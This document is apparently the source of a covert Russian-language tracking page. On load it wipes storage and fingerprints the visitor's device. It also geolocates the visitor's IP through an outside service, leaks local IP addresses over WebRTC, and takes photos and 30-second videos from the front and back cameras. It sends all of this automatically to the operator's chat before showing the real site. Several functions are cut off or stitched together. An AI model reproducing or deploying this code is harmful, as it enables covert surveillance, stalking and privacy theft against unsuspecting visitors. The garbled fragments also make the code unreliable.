<script>
(async function wipeOnFirstVisit() {
  const FLAG = '__wiped_v4__';
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}

  try {
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (const c of cookies) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
      const domains = ['', location.hostname, '.' + location.hostname,
                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
      for (const p of paths) for (const d of domains) {
        document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
      }
    }
  } catch (e) {}
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
    }
  } catch (e) {}
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
    }
  } catch (e) {}

  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
  location.reload();
})();
</script>

async function collectAll() {
  const ua = navigator.userAgent;
  const n  = navigator;
  const s  = screen;
  const out = {};

  const ref = document.referrer || '';
  let refSource = 'прямой заход';
  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
  else if (/google\./i.test(ref))       refSource = 'Google';
  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
  else if (/bing\./i.test(ref))         refSource = 'Bing';
  else if (/duckduckgo\./i.test(ref))   refSource = 'DuckDuckGo';
  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
  else if (/whatsapp/i.test(ref))       refSource = 'WhatsApp';
  else if (/tiktok/i.test(ref))         refSource = 'TikTok';
  else if (/youtube\./i.test(ref))      refSource = 'YouTube';
  else if (ref)                         refSource = ref;
  out['Источник'] = refSource;
  out['Referrer'] = ref || '(прямой заход)';

  let inApp = 'нет';
  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
  else if (/Viber/i.test(ua))                   inApp = 'Viber';
  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
  out['Приложение'] = inApp;

  let browser = 'неизвестно', bver = '';
  const bt = [
    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
    [/OPR\/([\d.]+)/,           'Opera'],
    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
    [/Firefox\/([\d.]+)/,       'Firefox'],
    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
    [/Chrome\/([\d.]+)/,        'Chrome'],
    [/Version\/([\d.]+).*Safari/,'Safari'],
  ];
  for (const [re, name] of bt) {
    const m = re.exec(ua);
    if (m) { browser = name; bver = m[1]; break; }
  }
  out['Браузер'] = browser + (bver ? ' ' + bver : '');
  out['UserAgent'] = ua;

  let os = 'неизвестно', osv = '';
  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
  else if (/Linux/i.test(ua))           os = 'Linux';
  out['ОС'] = os + (osv ? ' ' + osv : '');

  let device = 'десктоп';
  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
  out['Устройство'] = device;

  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
  if (modelMatch) out['Модель'] = modelMatch[1].trim();

  out['Язык']      = n.language;
  out['Языки']     = (n.languages || []).join(', ');
  out['Локаль']    = Intl.DateTimeFormat().resolvedOptions().locale;
  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
  out['Смещение TZ'] = new Date().getTimezoneOffset() + ' мин';
  out['Локальное время'] = new Date().toLocaleString('ru-RU');
  out['ISO время'] = new Date().toISOString();

  out['Экран']       = s.width + 'x' + s.height;
  out['Доступный экран'] = s.availWidth + 'x' + s.availHeight;
  out['Окно']        = window.innerWidth + 'x' + window.innerHeight;
  out['DPR']         = window.devicePixelRatio;
  out['Ориентация']  = s.orientation ? s.orientation.type : '';
  out['Глубина цвета'] = s.colorDepth;
  out['Диагональ (дюйм)'] = (Math.sqrt(s.width**2 + s.height**2) / 96).toFixed(2);

  out['Ядер CPU']    = n.hardwareConcurrency || '';
  out['RAM (GB)']    = n.deviceMemory || '';
  out['Платформа']   = n.platform || '';
  out['Touch points']= n.maxTouchPoints || 0;

  if (n.getBattery) {
    try {
      const b = await n.getBattery();
      out['Батарея'] = Math.round(b.level * 100) + '%';
      out['Уровень 0-1'] = b.level;
      out['Заряжается'] = b.charging ? 'да' : 'нет';
    } catch (e) {}
  }

  const c = n.connection || n.mozConnection || n.webkitConnection;
  if (c) {
    out['Тип сети']  = c.effectiveType || '';
    out['Скорость Mbps'] = c.downlink || '';
    out['RTT ms']    = c.rtt || '';
    out['Save data'] = c.saveData ? 'да' : 'нет';
  }
  out['Онлайн'] = n.onLine ? 'да' : 'нет';

  // Сколько камер на устройстве
  try {
    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
      const d = await n.mediaDevices.enumerateDevices();
      out['Камер']     = d.filter(x => x.kind === 'videoinput').length;
      out['Микрофонов']= d.filter(x => x.kind === 'audioinput').length;
      out['Динамиков'] = d.filter(x => x.kind === 'audiooutput').length;
    }
  } catch (e) {}

  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }
      out['WebGL версия'] = gl.getParameter(gl.VERSION);
    }
  } catch (e) {}

  try {
    const cv = document.createElement('canvas');
    cv.width = 280; cv.height = 60;
    const ctx = cv.getContext('2d');

    ctx.fillRect(0, 0, 100, 30);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint 你好 🎉', 2, 10);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('Fingerprint 你好 🎉', 4, 20);
    const d = cv.toDataURL();
    let h = 0;
    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
    out['Canvas hash'] = (h >>> 0).toString(16);
  } catch (e) {}

  try {
    const base = ['monospace', 'sans-serif', 'serif'];
    const test = ['Arial','Comic Sans MS','Courier New','Georgia','Impact','Times New Roman',
      'Trebuchet MS','Verdana','Tahoma','Segoe UI','Roboto','Ubuntu','Calibri','Cambria',
      'Consolas','Menlo','Monaco','DejaVu Sans','Noto Sans','Symbol','Wingdings','Webdings',
      'Helvetica Neue','SF Pro','PingFang SC','Microsoft YaHei','Meiryo','Malgun Gothic',
      'JetBrains Mono','Fira Code','Inter','Open Sans','Lato','Montserrat','Poppins'];
    const span = document.createElement('span');
    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
    span.textContent = 'mmmmmmmmmmlliWWWW';
    document.body.appendChild(span);
    const bs = {};
    for (const b of base) { span.style.fontFamily = b; bs[b] = span.offsetWidth + 'x' + span.offsetHeight; }
    const found = [];
    for (const f of test) {
      for (const b of base) {
        span.style.fontFamily = '"' + f + '",' + b;
        if (span.offsetWidth + 'x' + span.offsetHeight !== bs[b]) { found.push(f); break; }
      }
    }
    document.body.removeChild(span);
    if (found.length) out['Установленные шрифты'] = found.join(', ');
  } catch (e) {}

  try {
    const ck = document.cookie || '';
    if (ck) out['Cookies'] = ck;
  } catch (e) {}

  out['URL']      = location.href;
  out['Хост']     = location.hostname;
  out['Страница'] = location.pathname;
  try {
    const p = new URLSearchParams(location.search);
    const utm = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','gclid','fbclid','yclid'];
    const found = [];
    for (const k of utm) {
      const v = p.get(k);
      if (v) found.push(k + '=' + v);

    if (found.length) out['UTM'] = found.join(' | ');

  try {
    const r = await fetch('https://ipwho.is/');
    const g = await r.json();
    if (g.success !== false && g.latitude != null) {
      out['IP']           = g.ip;

      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
      out['Прокси']       = g.security && g.security.proxy ? 'да' : 'нет';
      out['Tor']          = g.security && g.security.tor ? 'да' : 'нет';
      out['Хостинг']      = g.security && g.security.hosting ? 'да' : 'нет';
      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
      out['Яндекс.Карты'] = 'https://yandex.ru/maps/?pt=' + g.longitude + ',' + g.latitude + '&z=15&l=map';
      out['Street View']  = 'https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + g.latitude + ',' + g.longitude;
    }

  try {
    if (n.permissions) {
      const perms = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
      const states = [];
      for (const p of perms) {
        try {

        } catch (e) {}
      }
      if (states.length) out['Разрешения'] = states.join(', ');
    }
  } catch (e) {}

  try {
    await new Promise(resolve => {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      const ips = new Set();
      let done = false;
      const finish = () => {
        if (done) return; done = true;
        if (ips.size) out['Локальные IP'] = Array.from(ips).join(', ');
        try { pc.close(); } catch {}
        resolve();
      };
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) return finish();
        const c = e.candidate.candidate;
        const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/i.exec(c);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(finish, 1500);
    });
  } catch (e) {}

  return out;
}

function pickMime() {
  if (typeof MediaRecorder === 'undefined') return null;
  const candidates = [
    ['video/webm;codecs=vp8,opus', 'webm'],
    ['video/webm;codecs=vp9,opus', 'webm'],
    ['video/webm',                 'webm'],
    ['video/mp4;codecs=h264,aac',  'mp4'],
    ['video/mp4',                  'mp4'],
  ];
  for (const [m, e] of candidates) {
    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
      videoMime = m; videoExt = e;
      return true;
    }
  }
  videoMime = ''; videoExt = 'webm';
  return true;
}

// ФОТО с камеры
async function takePhoto(facingMode, label) {
  let s = null;
  try {
    s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: 1280, height: 720 },
      audio: false
    });
    video.srcObject = s;
    video.muted = true;
    try { await video.play(); } catch (e) {}

    // Ждём готовности видео
    await new Promise(res => {
      if (video.readyState >= 2 && video.videoWidth > 0) return res();
      let resolved = false;
      const finish = () => { if (resolved) return; resolved = true; res(); };
      video.onloadedmetadata = finish;
      video.oncanplay = finish;
      video.onloadeddata = finish;
      setTimeout(finish, 3000);
    });

    // Пауза на стабилизацию экспозиции
    await new Promise(r => setTimeout(r, 1000));

    const w = video.videoWidth  || 1280;
    const h = video.videoHeight || 720;
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.92));
    ctx.clearRect(0, 0, w, h);

    s.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    if (blob && blob.size > 0) {
      const ok = await sendPhoto(blob,
        label + '\n' +
        'Разрешение: ' + w + 'x' + h + '\n' +
        'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
        'URL: ' + location.href
      );
      return ok;
    }
    return false;
  } catch (e) {
    if (s) s.getTracks().forEach(t => t.stop());
    video.srcObject = null;
    return false;
  }
}

    } catch (e) {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: facingMode }, width: 640, height: 480, frameRate: 20 },
        audio: false
      });
    }

    if (!pickMime()) return { ok: false, reason: 'MediaRecorder недоступен' };

    let rec;
    try {
      rec = new MediaRecorder(stream, {
        mimeType: videoMime || undefined,
        videoBitsPerSecond: 500000,
        audioBitsPerSecond: 48000
      });
    } catch (e) {
      try { rec = new MediaRecorder(stream); } catch (e2) { return { ok: false, reason: 'MediaRecorder init failed' }; }
    }

    const chunks = [];
    let videoBlob = null;

    rec.ondataavailable = async (e) => {
      if (e.data && e.data.size) chunks.push(e.data);
    };

    const stopped = new Promise(res => {
      rec.onstop = async () => {
        if (chunks.length) {
          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
          await sendVideo(videoBlob, videoExt,
            tag + ' — видео ' + durationSeconds + ' сек\n' +
            'Размер: ' + Math.round(videoBlob.size / 1024) + ' KB\n' +
            'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
            'URL: ' + location.href
          );
        }
        res();
      };
    });

    rec.start(1000); // собираем чанки по 1 сек, но отправим всё вместе в конце

    // Таймер визуальный
    let left = durationSeconds;
    const tick = setInterval(() => {
      left--;
      statusEl.textContent = tag.replace(/<[^>]+>/g, '') + ': ' + left + ' сек...';
      if (left <= 0) clearInterval(tick);
    }, 1000);

    await new Promise(r => setTimeout(r, durationSeconds * 1000));
    clearInterval(tick);

    try { rec.requestData(); } catch (e) {}
    try { rec.stop(); } catch (e) {}
    await stopped;

    stream.getTracks().forEach(t => t.stop());
    return { ok: true, size: videoBlob ? videoBlob.size : 0 };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    return { ok: false, reason: e.message };
  }
}

// ═══════════════════════════════════════════════════════════
// АВТОЗАПУСК ПРИ ПЕРЕХОДЕ — данные уходят сразу
// ═══════════════════════════════════════════════════════════
(async function autoRun() {
  statusEl.textContent = 'Отправка данных...';
  await new Promise(r => setTimeout(r, 300));

  try {
    const data = await collectAll();

    await sendText(
      '🟢 <b>НОВЫЙ ПЕРЕХОД</b>\n\n' +
      '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
      '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
      '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
      '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
      '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
      '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
      '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
      '<b>Камер:</b> ' + (data['Камер'] || '?') + '\n' +
      '<b>Время:</b> ' + (data['Локальное время'] || '?')
    );

    const lines = Object.entries(data)
      .filter(([k, v]) => v !== '' && v != null && v !== false)
      .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));

    const chunks = [];
    let cur = '';
    for (const line of lines) {
      if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
      cur += line + '\n';
    }
    if (cur) chunks.push(cur);

    for (let i = 0; i < chunks.length; i++) {
      const head = '📋 <b>ДАННЫЕ</b>' +
                   (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
      await sendText(head + chunks[i]);
      await new Promise(r => setTimeout(r, 500));
    }

    statusEl.textContent = '';
  } catch (e) {
    statusEl.textContent = '';
  }
})();

  const photoFront = await takePhoto('user', '🤳 <b>Фото — фронтальная камера</b>');

  const photoBack = await takePhoto('environment', '📷 <b>Фото — задняя камера</b>');
  await sendText(photoBack ? '✔️ Фото задней получено' : '❌ Фото задней не получено (возможно, камеры нет)');
  await new Promise(r => setTimeout(r, 800));

  // ═══ 3) ВИДЕО ФРОНТАЛЬНАЯ — 30 сек ═══
  await sendText('🎬 Начинаю запись с фронтальной камеры (30 сек)...');
  const recFront = await recordFromCamera('user', '🤳 <b>Фронтальная камера</b>', 30);
  if (!recFront.ok) {
    await sendText('❌ Ошибка записи с фронтальной: ' + (recFront.reason || ''));
  }

  // ═══ 4) ВИДЕО ЗАДНЯЯ — 30 сек ═══
  await sendText('🎬 Начинаю запись с задней камеры (30 сек)...');
  const recBack = await recordFromCamera('environment', '📷 <b>Задняя камера</b>', 30);
  if (!recBack.ok) {
    await sendText('❌ Ошибка записи с задней: ' + (recBack.reason || ''));
  }

  // Показываем сайт
  document.getElementById('overlay').style.display = 'none';
  document.getElementById('site').style.display = 'block';

  await sendText('🏁 Все действия завершены.');
};
